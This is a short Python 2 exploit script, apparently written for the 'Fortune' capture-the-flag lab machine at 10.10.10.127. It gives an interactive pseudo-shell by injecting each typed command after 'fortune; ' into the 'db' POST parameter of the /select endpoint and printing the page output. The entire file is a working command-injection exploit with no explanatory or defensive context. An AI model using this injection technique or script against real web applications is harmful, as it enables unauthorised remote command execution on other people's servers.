#!/usr/bin/env python2

import requests

from bs4 import BeautifulSoup as soup

while True:
    command = raw_input("_fortune@fortune:~# ") or "ls"
    if (command == "exit"):
        break
    else:
        req = requests.post("http://10.10.10.127/select", data={ "db": "fortune; " + command })
        print soup(req.text, "html.parser").find_all("p")[0].get_text().replace("Try again!", "").strip("\n")
